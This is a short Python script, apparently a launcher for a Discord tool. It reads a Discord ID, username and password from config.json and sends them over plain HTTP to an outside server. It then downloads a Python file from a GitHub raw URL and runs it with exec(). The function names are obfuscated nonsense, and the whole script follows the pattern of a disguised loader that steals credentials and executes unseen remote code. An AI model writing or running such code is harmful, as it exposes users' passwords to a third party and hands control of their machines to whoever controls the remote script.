import os

try:
    import requests
    import json
    import discord
    import aiohttp
    import websockets
    import pytz
except ModuleNotFoundError:
    os.system("python -m pip install requests")
    os.system("python -m pip install discord.py==2.3.1")
    os.system("python -m pip install aiohttp")
    os.system("python -m pip install websockets")
    os.system("python -m pip install pytz")

try:
    with open('config.json', 'r') as f:
        config = json.load(f)
except KeyError:
    print('Invalid config.json')
    exit()

discord_id = config['info']['discord_id']
username = config['info']['username']
password = config['info']['password']

def kaakmakmmfkaeknfjaenjaw(username, password, discord_id):
    response = requests.post(
        'http://astro.facal.me:3943/oaloamsnjfngxkxcnzbajsmvls',
        json={'discord_id': discord_id, 'username': username, 'password': password}
    )

    if response.status_code == 200:
        data = response.json()
        jwtToken = data['akntjhebathaknrkantrka']
        return jwtToken
    else:
        return None

def zkamfoamnejhebtaksgotgnaf(jwtToken):
    response = requests.get('https://raw.githubusercontent.com/CristianMB2255/asgrhtkp-oi-i-rt/main/x.py')

    if response.status_code == 200:
        script = response.text
        exec(script, {'jsmgklagoalrkartv': jwtToken})
    else:
        print('Error :(')

jwtToken = kaakmakmmfkaeknfjaenjaw(username, password, discord_id)
if jwtToken:
    zkamfoamnejhebtaksgotgnaf(jwtToken)
else:
    print('Invalid credentials')
